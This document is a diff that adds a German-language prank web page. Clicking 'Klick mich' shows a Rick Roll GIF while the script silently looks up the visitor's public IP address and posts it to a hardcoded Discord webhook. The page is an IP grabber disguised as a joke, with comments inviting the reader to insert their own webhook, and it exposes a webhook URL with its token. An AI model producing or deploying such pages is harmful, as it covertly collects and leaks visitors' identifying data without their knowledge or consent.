@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fisch</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #5674a3;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            margin-top: 50px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #674580;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #af7dd4;
+        }
+
+        #gif-container {
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Klicke den Knopf um etwas witziges zu sehen</h1>
+    <button onclick="playGif()">Klick mich</button>
+    <div id="gif-container"></div>
+
+    <script>
+        function playGif() {
+            // Zeigt das Rick Roll GIF an
+            const gifUrl = "https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif";
+            const gifContainer = document.getElementById("gif-container");
+            gifContainer.innerHTML = `<img src="${gifUrl}" alt="Rick Roll GIF" width="400">`;
+
+            //Hier passiert der main part
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const visitorIp = data.ip;
+
+                    //Füge hier dein discord webhook ein
+                    const webhookUrl = "https://discord.com/api/webhooks/1332789252794220594/Pv7Ke3RRvuyBHJm1A8LcFjatqn4husc41q3F0csC5zNSHSUCoDUTNJUuTIo4JtT2jI47";
+
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            content: `Nutzer IP: ${visitorIp}`,
+                        }),
+                    });
+                })
+                .catch(error => console.error("Fehler beim Abrufen der IP:", error));
+        }
+    </script>
+</body>
+</html>
